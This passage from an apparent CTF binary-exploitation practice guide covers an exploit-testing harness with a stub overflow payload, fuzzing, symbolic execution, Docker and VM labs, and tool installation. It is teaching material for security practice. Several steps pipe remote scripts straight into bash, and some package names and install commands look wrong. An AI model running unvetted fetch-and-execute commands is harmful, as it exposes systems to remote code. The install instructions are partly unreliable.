        log.info(f"Remote success rate: {success_rate:.1f}%")
        
        return success_rate
    
    def _check_success(self, result):
        """Check if exploitation succeeded"""
        success_indicators = [
            b'flag{',
            b'FLAG{',
            b'/bin/sh',
            b'uid=',  # From 'id' command
            b'$ ',    # Shell prompt
        ]
        
        return any(ind in result for ind in success_indicators)
    
    def _save_flag(self, data):
        """Save captured flag"""
        with open('captured_flags.txt', 'a') as f:
            f.write(f"{data}\n")
        log.success("Flag saved to captured_flags.txt")

# Usage example
def my_exploit(p):
    # [Your exploit code]
    payload = b'A' * 264 + p64(win_addr)
    p.sendline(payload)
    return p.recvall(timeout=2)

if __name__ == '__main__':
    tester = ExploitTester('./challenge', my_exploit)
    
    # Test locally first
    local_rate = tester.test_local(iterations=10)
    
    # If reliable locally, test remote
    if local_rate >= 80:
        tester.test_remote('chall.ctf', 1337, iterations=5)
    else:
        log.warning("Local exploit unreliable, fix before testing remote")
```

### Exploit Development Workflow

**Rapid Iteration Setup**

```bash
#!/bin/bash
# watch_and_test.sh - Auto-run exploit when file changes

EXPLOIT_SCRIPT="exploit.py"
TARGET="local"  # or "remote"

echo "[*] Watching $EXPLOIT_SCRIPT for changes..."
echo "[*] Target: $TARGET"

while true; do
    # Wait for file modification
    inotifywait -e modify $EXPLOIT_SCRIPT
    
    clear
    echo "=== Running exploit ($(date)) ==="
    
    # Run exploit
    python3 $EXPLOIT_SCRIPT $TARGET
    
    echo ""
    echo "=== Waiting for changes ==="
done
```

**Version Control for Exploits**

```bash
# Git workflow for exploit development

# Initialize repo
git init exploit_development
cd exploit_development

# Create structure
mkdir -p {attempts,working,final}

# Track progress
git add attempts/exploit_v1.py
git commit -m "Initial attempt: basic overflow"

git add attempts/exploit_v2.py
git commit -m "Added ROP chain, crashes at gadget 3"

git add working/exploit_v3.py
git commit -m "Fixed alignment issue, works locally"

git add final/exploit.py
git commit -m "Captured flag on remote"

# Tag successful exploits
git tag -a challenge_solved -m "Final working exploit"

# Review history to understand progression
git log --oneline --graph
```

**Collaborative Local Testing**

````markdown
## Team Practice Environment

For team-based CTF practice:

**Shared infrastructure**:
```bash
# Set up shared challenge server
# Using DigitalOcean/AWS/GCP instance

# On server:
docker-compose up -d ctf-challenges

# Challenges accessible at:
# http://team-server.com:10001 - challenge1
# http://team-server.com:10002 - challenge2
# etc.
````

**docker-compose.yml for multiple challenges**:

```yaml
version: '3'
services:
  challenge1:
    build: ./challenge1
    ports:
      - "10001:1337"
    restart: always
    
  challenge2:
    build: ./challenge2
    ports:
      - "10002:1337"
    restart: always
  
  # Add more challenges as needed
```

**Benefits**:

- Team members can test without local setup
- Consistent environment for all testers
- Easy to update/patch challenges
- Simulates real CTF infrastructure

````

### Advanced Testing Techniques

**Fuzzing Integration**
```python
#!/usr/bin/env python3
"""Use AFL++ to discover crashes, then exploit manually"""

import subprocess
import os

def setup_afl():
    """Prepare binary for AFL fuzzing"""
    # Instrument binary
    subprocess.run([
        'afl-gcc',
        '-o', 'challenge_afl',
        'challenge.c'
    ])
    
    # Create input/output directories
    os.makedirs('afl_in', exist_ok=True)
    os.makedirs('afl_out', exist_ok=True)
    
    # Create seed inputs
    with open('afl_in/seed1', 'wb') as f:
        f.write(b'A' * 100)

def run_fuzzing(timeout_minutes=60):
    """Run AFL fuzzer"""
    subprocess.run([
        'afl-fuzz',
        '-i', 'afl_in',
        '-o', 'afl_out',
        '-t', '1000',  # Timeout per execution (ms)
        '--', './challenge_afl'
    ], timeout=timeout_minutes * 60)

def analyze_crashes():
    """Analyze discovered crashes"""
    crash_dir = 'afl_out/default/crashes'
    
    for crash_file in os.listdir(crash_dir):
        if crash_file.startswith('id:'):
            print(f"\n[*] Analyzing {crash_file}")
            
            # Run with crashing input in GDB
            with open(f'{crash_dir}/{crash_file}', 'rb') as f:
                crash_input = f.read()
            
            # Generate GDB script
            gdb_script = f'''
            run <<< "{crash_input.hex()}"
            bt
            info registers
            quit
            '''
            
            # Analyze crash
            result = subprocess.run([
                'gdb', '-batch', '-x', '-',
                './challenge'
            ], input=gdb_script.encode(), capture_output=True)
            
            print(result.stdout.decode())

# Workflow
if __name__ == '__main__':
    setup_afl()
    run_fuzzing(timeout_minutes=30)
    analyze_crashes()
````

**Symbolic Execution for Path Discovery**

```python
#!/usr/bin/env python3
"""Use angr to find paths to win condition"""

import angr
import claripy

def find_win_path(binary_path):
    """Use symbolic execution to find path to win function"""
    
    # Load binary
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # Create symbolic input
    flag = claripy.BVS('flag', 8 * 100)  # 100-byte symbolic input
    
    # Create initial state
    state = proj.factory.entry_state(stdin=flag)
    
    # Create simulation manager
    simgr = proj.factory.simulation_manager(state)
    
    # Find address of win function
    win_addr = proj.loader.find_symbol('win').rebased_addr
    
    # Explore to win function, avoiding failure paths
    simgr.explore(find=win_addr, avoid=[0x40XXXX])  # Avoid error handlers
    
    if simgr.found:
        found_state = simgr.found[0]
        
        # Get concrete input that reaches win
        solution = found_state.solver.eval(flag, cast_to=bytes)
        print(f"[+] Found input: {solution}")
        
        return solution
    else:
        print("[-] No path found to win function")
        return None

# Usage
solution = find_win_path('./challenge')
if solution:
    # Test solution
    from pwn import *
    p = process('./challenge')
    p.send(solution)
    print(p.recvall())
```

### Related Essential Topics

**Complementary practice areas**:

- **Reverse engineering foundations**: IDA Pro/Ghidra proficiency, assembly reading fluency
- **Operating system internals**: Process memory layout, syscall mechanisms, ELF format
- **Networking fundamentals**: TCP/IP, socket programming, protocol analysis
- **Scripting automation**: Python for exploit development, bash for environment management
- **Competition psychology**: Stress management, time optimization, team dynamics

**Advanced practice resources**:

- **Exploit Education** (exploit.education): Progressive difficulty, well-documented
- **Root-Me** (root-me.org): Large challenge collection, community solutions
- **HackTheBox Pro Labs**: Realistic multi-stage scenarios
- **Real CVE exploitation**: Practice with disclosed vulnerabilities (exploit-db.com)
- **Academic papers**: Research-level techniques (USENIX Security, IEEE S&P)

---

## Docker for Challenge Isolation

Docker provides reproducible, isolated environments for CTF challenges, enabling safe exploit testing and multi-challenge management.

**Docker fundamentals**

Docker containers provide lightweight virtualization:

```
Container: Isolated process environment
Image: Template for creating containers
Dockerfile: Instructions to build image
Registry: Repository of images (Docker Hub, etc.)
```

**Docker installation**

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install docker.io

# Start Docker daemon
sudo systemctl start docker
sudo systemctl enable docker

# Verify installation
docker --version
docker run hello-world
```

**User permission setup**

Allow non-root Docker access:

```bash
# Create docker group
sudo groupadd docker

# Add user to group
sudo usermod -aG docker $USER

# Apply group changes
newgrp docker

# Verify
docker run hello-world
```

**Basic Docker commands**

```bash
# Pull image
docker pull ubuntu:20.04

# Run container
docker run -it ubuntu:20.04 /bin/bash

# List running containers
docker ps

# List all containers
docker ps -a

# Stop container
docker stop <container_id>

# Remove container
docker rm <container_id>

# List images
docker images

# Remove image
docker rmi <image_id>
```

**Creating Dockerfile for CTF challenges**

Basic structure:

```dockerfile
FROM ubuntu:20.04

# Install dependencies
RUN apt-get update && apt-get install -y \
    build-essential \
    python3 \
    gdb \
    gdbserver \
    netcat \
    strace

# Copy challenge binary
COPY challenge /home/challenge

# Set working directory
WORKDIR /home/challenge

# Create non-root user
RUN useradd -m ctf

# Change ownership
RUN chown -R ctf:ctf /home/challenge

# Switch user
USER ctf

# Expose port for remote debugging
EXPOSE 1234

# Default command
CMD ["/bin/bash"]
```

**Build custom image**

```bash
# Build from Dockerfile
docker build -t ctf-challenge:latest .

# Tag image
docker tag ctf-challenge:latest myregistry/ctf-challenge:v1.0

# Build with build args
docker build --build-arg BASE_IMAGE=ubuntu:20.04 -t ctf-challenge .
```

**Running CTF challenges**

```bash
# Interactive shell
docker run -it ctf-challenge /bin/bash

# Run specific command
docker run ctf-challenge ./challenge

# Mount local directory
docker run -it -v /path/to/local:/home/challenge ctf-challenge

# Port forwarding
docker run -it -p 4444:4444 ctf-challenge

# Expose all ports
docker run -it -P ctf-challenge

# Set environment variables
docker run -it -e FLAG="flag{secret}" ctf-challenge

# Memory/CPU limits
docker run -it --memory=256m --cpus=1 ctf-challenge

# Network isolation
docker run -it --network=isolated ctf-challenge
```

**Dockerfile for exploitation testing**

```dockerfile
FROM ubuntu:20.04

# Disable interactive prompts
ENV DEBIAN_FRONTEND=noninteractive

# Install exploitation tools
RUN apt-get update && apt-get install -y \
    build-essential \
    gcc-multilib \
    python3 \
    python3-pip \
    gdb \
    gdb-multiarch \
    binutils \
    binutils-multiarch \
    netcat \
    strace \
    ltrace \
    objdump \
    readelf \
    strings \
    file \
    git \
    wget \
    curl \
    tmux \
    vim \
    nano

# Install pwntools
RUN pip3 install pwntools

# Install ROPgadget
RUN pip3 install ropgadget

# Install ropper
RUN pip3 install ropper

# Install one_gadget
RUN apt-get install -y ruby-dev && \
    gem install one_gadget

# Create work directory
WORKDIR /work

# Non-root user
RUN useradd -m -s /bin/bash ctf
USER ctf

CMD ["/bin/bash"]
```

**Build exploitation tools container**

```bash
docker build -t ctf-exploit-tools:latest .

# Run with volume for challenges
docker run -it -v /path/to/challenges:/work ctf-exploit-tools
```

**Docker Compose for complex setups**

Multiple services (binary, server, database):

```yaml
version: '3'

services:
  challenge:
    build: ./challenge
    ports:
      - "4444:4444"
    environment:
      FLAG: "flag{docker_compose_test}"
    volumes:
      - ./challenge:/home/challenge
  
  server:
    build: ./server
    ports:
      - "5555:5555"
    depends_on:
      - challenge
    links:
      - challenge
  
  database:
    image: postgres:13
    environment:
      POSTGRES_PASSWORD: secret
    volumes:
      - db_data:/var/lib/postgresql/data

volumes:
  db_data:
```

**Run with Docker Compose**

```bash
# Start services
docker-compose up

# Start in background
docker-compose up -d

# View logs
docker-compose logs -f

# Stop services
docker-compose down

# Specific service
docker-compose up challenge
```

**Remote debugging in Docker**

```dockerfile
FROM ubuntu:20.04

RUN apt-get update && apt-get install -y \
    gdbserver \
    gdb \
    build-essential

COPY challenge /home/challenge
WORKDIR /home/challenge

EXPOSE 1234

# Start gdbserver instead of binary
CMD ["gdbserver", "0.0.0.0:1234", "./challenge"]
```

**Connect from host**

```bash
# Run container with port forwarding
docker run -it -p 1234:1234 ctf-challenge

# From another terminal, connect GDB
gdb ./challenge
(gdb) target remote localhost:1234
(gdb) break main
(gdb) continue
```

**Networking between containers**

```bash
# Create network
docker network create ctf-net

# Run containers on network
docker run -it --network ctf-net --name challenge1 ctf-challenge
docker run -it --network ctf-net --name exploit ctf-challenge

# From exploit container
root@exploit:/# nc challenge1 4444
```

**Docker security considerations**

```dockerfile
# Run as non-root
RUN useradd -m ctf
USER ctf

# Read-only root filesystem (optional)
docker run --read-only --tmpfs /tmp ctf-challenge

# Drop capabilities
docker run --cap-drop=ALL ctf-challenge

# Resource limits
docker run --memory=512m --cpus=0.5 ctf-challenge
```

**Practice: Multi-challenge Docker environment**

```bash
# Create directory structure
mkdir -p ctf-challenges/{challenge1,challenge2,challenge3}

# Each challenge with Dockerfile
# challenge1/Dockerfile
# challenge2/Dockerfile
# challenge3/Dockerfile

# Master docker-compose.yml
cat > docker-compose.yml << 'EOF'
version: '3'

services:
  challenge1:
    build: ./challenge1
    ports:
      - "4001:4444"
  challenge2:
    build: ./challenge2
    ports:
      - "4002:4444"
  challenge3:
    build: ./challenge3
    ports:
      - "4003:4444"
EOF

docker-compose up
```

**Cleanup and maintenance**

```bash
# Remove unused images
docker image prune

# Remove unused containers
docker container prune

# Remove unused networks
docker network prune

# Remove everything (careful!)
docker system prune -a

# View disk usage
docker system df
```

---

## VM Setup for Binary Analysis

Virtual machines provide isolated analysis environments without Docker overhead.

**Hypervisor selection**

**VirtualBox (free, cross-platform):**

```bash
sudo apt-get install virtualbox
sudo apt-get install virtualbox-guest-additions-iso
```

**KVM/QEMU (Linux-native):**

```bash
sudo apt-get install qemu-kvm libvirt-daemon-system libvirt-clients
sudo usermod -aG kvm $USER
sudo usermod -aG libvirt $USER
```

**VMware (commercial):**

```bash
# Download VMware Player or Workstation
# Free for personal use
```

**VM creation in VirtualBox**

```bash
# Command-line VM creation
VBoxManage createvm --name ctf-analysis --ostype Ubuntu_64

# Set memory and CPU
VBoxManage modifyvm ctf-analysis --memory 4096 --cpus 4

# Create virtual disk
VBoxManage createhd --filename ctf-analysis.vdi --size 50000

# Attach disk
VBoxManage storagectl ctf-analysis --name SATA --add sata
VBoxManage storageattach ctf-analysis --storagectl SATA \
  --port 0 --device 0 --type hdd --medium ctf-analysis.vdi

# Attach ISO
VBoxManage storageattach ctf-analysis --storagectl SATA \
  --port 1 --device 0 --type dvddrive --medium ubuntu.iso

# Start VM
VBoxHeadless --startvm ctf-analysis

# Connect via RDP
rdesktop localhost:3389
```

**VM creation in KVM**

```bash
# Create virtual disk
qemu-img create -f qcow2 ctf-analysis.qcow2 50G

# Create VM from ISO
virt-install --name ctf-analysis \
  --ram 4096 \
  --vcpus 4 \
  --disk path=ctf-analysis.qcow2,format=qcow2 \
  --cdrom ubuntu-20.04.iso \
  --network default \
  --graphics vnc,listen=0.0.0.0

# List VMs
virsh list --all

# Start VM
virsh start ctf-analysis

# Connect via VNC
vncviewer localhost:5900
```

**Linux OS installation best practices**

```bash
# Minimal installation focus
# - Base system + development tools
# - No unnecessary packages
# - Smaller attack surface

# After installation, update
sudo apt-get update
sudo apt-get upgrade -y

# Install development essentials
sudo apt-get install -y \
    build-essential \
    git \
    curl \
    wget \
    vim \
    tmux
```

**Baseline exploitation tools installation**

```bash
#!/bin/bash
# install-ctf-tools.sh

set -e

echo "[*] Installing CTF exploitation tools..."

# Update
sudo apt-get update
sudo apt-get upgrade -y

# Debuggers and disassemblers
sudo apt-get install -y \
    gdb \
    gdb-multiarch \
    binutils \
    binutils-multiarch \
    radare2 \
    cutter

# Reverse engineering
sudo apt-get install -y \
    ghidra \
    ida-free \
    binaryninja

# Analysis tools
sudo apt-get install -y \
    strace \
    ltrace \
    objdump \
    readelf \
    strings \
    file \
    checksec

# Exploitation frameworks
sudo apt-get install -y \
    metasploit-framework

# Python and libraries
sudo apt-get install -y \
    python3 \
    python3-pip \
    python3-dev

pip3 install --upgrade pip
pip3 install \
    pwntools \
    ropgadget \
    ropper \
    capstone \
    unicorn \
    keystone-engine

# Compilers for multiple architectures
sudo apt-get install -y \
    gcc-arm-linux-gnueabihf \
    gcc-aarch64-linux-gnu \
    gcc-mips-linux-gnu \
    gcc-mips64-linux-gnu \
    gcc-powerpc-linux-gnu

# Misc utilities
sudo apt-get install -y \
    tmux \
    vim \
    git \
    curl \
    wget \
    netcat \
    socat

echo "[+] Installation complete!"
```

**Run installation script**

```bash
chmod +x install-ctf-tools.sh
./install-ctf-tools.sh
```

**VM snapshots for quick recovery**

```bash
# VirtualBox snapshots
VBoxManage snapshot ctf-analysis take "clean-install"
VBoxManage snapshot ctf-analysis list
VBoxManage snapshot ctf-analysis restore "clean-install"

# KVM snapshots
virsh snapshot-create-as ctf-analysis clean-install
virsh snapshot-list ctf-analysis
virsh snapshot-revert ctf-analysis clean-install
```

**VM resource allocation**

```bash
# VirtualBox
VBoxManage modifyvm ctf-analysis --memory 8192    # 8GB RAM
VBoxManage modifyvm ctf-analysis --cpus 8         # 8 CPUs

# KVM
virsh edit ctf-analysis
# Modify <memory>, <vcpu> in XML

# Verify
VBoxManage showvminfo ctf-analysis | grep -E "Memory|CPU"
```

**Network configuration**

Bridged networking for multi-VM communication:

```bash
# VirtualBox
VBoxManage modifyvm ctf-analysis --nic1 bridged --bridgeadapter1 eth0

# KVM (via virsh XML)
virsh edit ctf-analysis
# Change <interface type='network'> to <interface type='bridge'>
```

**Shared folders between host and VM**

```bash
# VirtualBox shared folder
VBoxManage sharedfolder add ctf-analysis --name work \
  --hostpath /home/user/ctf-work

# Inside VM
sudo mount -t vboxsf work /mnt/work

# KVM/QEMU (requires 9pfs)
# In VM XML: <filesystem type='mount' accessmode='passthrough'>
#   <source dir='/home/user/ctf-work'/>
#   <target dir='work'/>
# </filesystem>
```

**VM for malware analysis**

Isolated VM without internet:

```bash
# VirtualBox: Disable network adapter
VBoxManage modifyvm ctf-analysis --nic1 none

# For analysis only
VBoxManage snapshot ctf-analysis take "malware-snapshot"
# Run malware analysis
VBoxManage snapshot ctf-analysis restore "malware-snapshot"
```

**VM cloning for parallel analysis**

```bash
# VirtualBox clone
VBoxManage clonehd ctf-analysis.vdi ctf-analysis-2.vdi
VBoxManage clonevm ctf-analysis --name ctf-analysis-2 \
  --register --basefolder ./vms

# KVM clone
virsh clone-volume ctf-analysis.qcow2 ctf-analysis-2.qcow2
```

**Practice: Multi-VM CTF lab**

```bash
#!/bin/bash
# setup-ctf-lab.sh

# Create 3 VMs for different purposes
# 1. Analysis VM (no internet, malware isolation)
# 2. Exploit dev VM (internet enabled)
# 3. Target VM (vulnerable service)

for i in 1 2 3; do
    VBoxManage createvm --name ctf-vm-$i --ostype Ubuntu_64
    VBoxManage modifyvm ctf-vm-$i --memory 4096 --cpus 4
    VBoxManage createhd --filename ctf-vm-$i.vdi --size 50000
    VBoxManage storagectl ctf-vm-$i --name SATA --add sata
    VBoxManage storageattach ctf-vm-$i --storagectl SATA \
      --port 0 --device 0 --type hdd --medium ctf-vm-$i.vdi
done

echo "[+] Created 3 CTF VMs"
```

---

## Tool Installation and Configuration

Comprehensive setup of exploitation tools and development environments.

**Package manager based installation**

```bash
# Ubuntu/Debian APT
sudo apt-get install -y \
    gdb \
    gdbserver \
    radare2 \
    binutils \
    python3-pip \
    git

# Fedora/RHEL DNF
sudo dnf install -y \
    gdb \
    radare2 \
    binutils \
    python3-pip \
    git

# Arch Linux pacman
sudo pacman -S \
    gdb \
    radare2 \
    binutils \
    python-pip \
    git
```

**Python tool installation via pip**

```bash
# Update pip
pip3 install --upgrade pip

# Core tools
pip3 install \
    pwntools \
    ropgadget \
    ropper \
    capstone \
    unicorn \
    keystone-engine \
    angr \
    triton

# Alternative sources
pip3 install --index-url https://pypi.org/simple/ pwntools

# Specific versions
pip3 install pwntools==4.8.0

# From GitHub
pip3 install git+https://github.com/Gallopsled/pwntools.git
```

**Metasploit installation**

```bash
# Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wls.erb > /tmp/metasploit-framework-wls.erb
chmod +x /tmp/metasploit-framework-wls.erb

# Or via apt (if available)
sudo apt-get install -y metasploit-framework

# Docker (easiest)
docker pull metasploitframework/metasploit-framework
docker run -it metasploitframework/metasploit-framework
```

**GDB plugins and extensions**

```bash
# GEF (GDB Enhanced Features)
bash -c "$(curl -sL https://github.com/hugsy/gef/raw/main/scripts/gef.sh)"

# PEDA (Python Exploit Development Assistance)
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# Voltron (debugger UI)
pip3 install voltron
```

**GDB configuration**

```bash
# ~/.gdbinit
set disassembly-flavor intel
set pagination off
set print asm-demangle on
set history save on
set history filename ~/.gdb_history

# Load plugins
source ~/peda/peda.py
# or
source ~/.gef.py

# Custom aliases
define pwndbg
    set disassembly-flavor intel
    set print asm-demangle on
end
```

**Radare2 configuration**

```bash
# ~/.radare2rc
e asm.arch=x86
e asm.bits=64
e asm.syntax=intel

# Custom analysis
aa
aaft

# Color scheme
ec
```

**Docker installation of all tools**

Single Dockerfile with everything:

```dockerfile
FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive

# Update and install base tools
RUN apt-get update && apt-get install -y \
    build-essential \
    python3 \
    python3-pip \
    git \
    curl \
    wget \
    vim \
    tmux \
    gdb \
    gdb-multiarch \
    radare2 \
    binutils \
    binutils-multiarch \
    objdump \
    readelf \
    strings \
    file \
    strace \
    ltrace \
    netcat \
    socat

# Install Python tools
RUN pip3 install --upgrade pip && \
    pip3 install \
    pwntools \
    ropgadget \
    ropper \
    capstone \
    keystone-engine \
    unicorn \
    angr

# GDB plugins
RUN bash -c "$(curl -sL https://github.com/hugsy/gef/raw/main/scripts/gef.sh)" && \
    echo "source ~/.gef.py" >> ~/.gdbinit

# Metasploit
RUN curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wls.erb | bash

# Non-root user
RUN useradd -m -s /bin/bash ctf
WORKDIR /work
USER ctf

CMD ["/bin/bash"]
```

**Quick verification of tools**

```bash
#!/bin/bash
# verify-tools.sh

echo "[*] Verifying CTF tools installation..."

# Check binary tools
for tool in gdb radare2 objdump readelf strings file strace ltrace; do
    if command -v $tool &> /dev/null; then
        echo "✓ $tool"
    else
        echo "✗ $tool (missing)"
    fi
done

# Check Python tools
for tool in pwntools ropgadget ropper capstone keystone unicorn; do
    if python3 -c "import ${tool//-/_}" 2>/dev/null; then
        echo "✓ $tool"
    else
        echo "✗ $tool (missing)"
    fi
done

echo "[+] Verification complete"
```

**IDE setup for exploit development**

**VS Code configuration:**

```json
{
    "python.linting.enabled": true,
    "python.linting.pylintEnabled": true,
    "python.formatting.provider": "black",
    "[python]": {
        "editor.defaultFormatter": "ms-python.python",
        "editor.formatOnSave": true
    },
    "terminal.integrated.defaultProfile.linux": "bash",
    "files.exclude": {
        "**/__pycache__": true
    }
}
```

**VS Code extensions for CTF:**

```bash
# Install extensions
code --install-extension ms-python.python
code --install-extension ms-vscode.cpptools
code --install-extension eamodio.gitlens
code --install-extension ms-vscode-remote.remote-ssh
code --install-extension ms-vscode.hexdump
```

**Environment variables for tools**

```bash
# ~/.bashrc
export PATH=$PATH:$HOME/.local/bin
export PATH=$PATH:/opt/ghidra/bin
export PATH=$PATH:/opt/radare2/bin

# Python path for custom modules
export PYTHONPATH=$PYTHONPATH:$HOME/ctf-utils

# GDB startup script
export GDBINIT=~/.gdbinit

# Pwntools config
export PWNTOOLS_TARGET_ARCH=amd64
export PWNTOOLS_TARGET_OS=linux
```

**Tmux configuration for CTF work**

```bash
# ~/.tmux.conf
set-option -g default-terminal "screen-256color"
set-option -g mouse on

# Status bar
set -g status-bg black
set -g status-fg white

# New session layouts
new-session -d -s ctf -x 120 -y 40

# Split windows
split-window -h -t ctf
split-window -v -t ctf:0.0

# Navigation keys
bind -n M-Left select-pane -L
bind -n M-Right select-pane -R
bind -n M-Up select-pane -U
bind -n M-Down select-pane -D
```

**Automated setup script**

```bash
#!/bin/bash
# setup-ctf-env.sh

set -e

echo "[*] Setting up CTF exploitation environment..."

# Create work directories
mkdir -p ~/ctf-challenges/{solved,unsolved,tools}
mkdir -p ~/ctf-notes
mkdir -p ~/ctf-writeups

# Install system packages
echo "[*] Installing system packages..."
sudo apt-get update
sudo apt-get install -y build-essential git curl wget python3-pip python3-dev

# List of tools
echo "[*] Installing exploitation tools..."
pip3 install pwntools ropgadget ropper

# Install GDB plugins
echo "[*] Installing GDB plugins..."
bash -c "$(curl -sL https://github.com/hugsy/gef/raw/main/scripts/gef.sh)"

# Setup git for writeups
cd ~/ctf-writeups
git init
git config user.email "ctf@example.com"
git config user.name "CTF Player"

# Create template exploit
cat > ~/ctf-challenges/template.py << 'EOF'
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# Challenge binary
TARGET = './binary'
REMOTE = False

def connect():
    if REMOTE:
        return remote('example.com', 4444)
    else:
        return process(TARGET)

def exploit():
    p = connect()
    
    # Exploit code here
    
    p.interactive()

if __name__ == '__main__':
    exploit()
EOF

echo "[+] CTF environment setup complete!"
echo "[+] Directories created in ~/ctf-*"
echo "[+] Template exploit: ~/ctf-challenges/template.py"
```

**Run setup**

```bash
chmod +x setup-ctf-env.sh
./setup-ctf-env.sh
```

**Tool testing checklist**

```bash
# Test pwntools
python3 << 'EOF'
from pwn import *
context.arch = 'amd64'
print("[✓] pwntools functional")
EOF

# Test GDB with plugin
gdb --version
gdb -q -ex "gef" -ex "quit"

# Test radare2
r2 /bin/ls -q -c "q"
echo "[✓] radare2 functional"

# Test ROPgadget
ROPgadget --binary /bin/ls --all 2>/dev/null | head -5
echo "[✓] ROPgadget functional"
```

**Common installation issues and solutions**

**pwntools fails with libffi error:**

```bash
sudo apt-get install libffi-dev
pip3 install --upgrade pwntools
```

**GDB plugins conflict:**

```bash
# Disable GEF if conflicts
echo "# source ~/.gef.py" >> ~/.gdbinit

# Use PEDA instead
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

**32-bit binary execution fails:**

```bash
# Install 32-bit libraries
sudo apt-get install libc6:i386 libstdc++6:i386

# Or within Docker with multiarch support
```

**Multi-architecture tool support:**

```bash
# Install multiarch compilers
sudo apt-get install gcc-arm-linux-gnueabihf
sudo apt-get install gcc-aarch64-linux-gnu
sudo apt-get install gcc-mips-linux-gnu

# Multiarch GDB
sudo apt-get install gdb-multiarch
```

**Practice: Complete environment setup**

```bash
#!/bin/bash
# complete-setup.sh - Full CTF environment

set -e

echo "[*] Complete CTF environment setup"

# 1. System packages
echo "[Step 1/5] Installing system packages..."
sudo apt-get update
sudo apt-get install -y \
    build-essential \
    git \
    python3 \
    python3-pip \
    python3-dev \
    libffi-dev \
    gdb \
    radare2 \
    binutils \
    curl \
    wget

# 2. Python tools
echo "[Step 2/5] Installing Python tools..."
pip3 install --upgrade pip
pip3 install pwntools ropgadget ropper

# 3. GDB configuration
echo "[Step 3/5] Configuring GDB..."
bash -c "$(curl -sL https://github.com/hugsy/gef/raw/main/scripts/gef.sh)"

# 4. Directory structure
echo "[Step 4/5] Creating CTF directories..."
mkdir -p ~/ctf/{challenges,tools,notes,writeups}

# 5. Verification
echo "[Step 5/5] Verifying tools..."
gdb --version | head -1
python3 -c "from pwn import *; print('✓ pwntools')"
r2 --version | head -1

echo "[+] Setup complete!"
echo "[+] Start with: cd ~/ctf/challenges"
```

**Run complete setup**

```bash
chmod +x complete-setup.sh
./complete-setup.sh
```

This comprehensive practice resources section enables CTF participants to establish reliable, reproducible, and fully-equipped exploitation environments for effective binary security challenge practice and competition participation.

---

